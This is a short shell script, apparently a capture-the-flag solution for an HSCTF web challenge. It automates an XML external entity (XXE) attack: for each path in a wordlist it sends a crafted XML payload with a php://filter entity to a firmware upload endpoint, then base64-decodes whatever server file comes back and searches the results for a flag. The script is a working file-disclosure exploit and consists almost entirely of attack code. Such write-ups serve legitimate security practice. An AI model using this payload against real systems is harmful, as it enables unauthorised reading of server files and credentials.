#!/usr/bin/env sh

#Requirements: nodejs, curl

while IFS= read -r file
do
  echo "Trying: $file"
  payload="<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> \
    <!DOCTYPE root [ \
    <!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=$file\"> ]> \
    <root><content>&x;</content> </root>"

  payload=$(echo "console.log(encodeURIComponent('$payload'))" | node)

  response=$(curl -s https://traffic-light-w.web.hsctf.com/firmware_upload.php?xml=$payload)
  
  if [[ $(echo $response | wc -c) != 1372 ]]
  then
    echo $response | cut -d ">" -f22 | cut -d '<' -f1 | cut -d ' ' -f2 | base64 -d > ./files/$(echo $file | sed "s/\//_/g")
    echo; echo "FOUND >>> $file";echo
  fi

done < "wordlist.txt"

flag=$(strings ./files/* | grep "flag")

if [[ $flag != '' ]]
then
  echo -e "\e[92mFlag:"; echo "$flag"
else
  echo -e "\e[92mFiles found:"
  ls ./files
fi

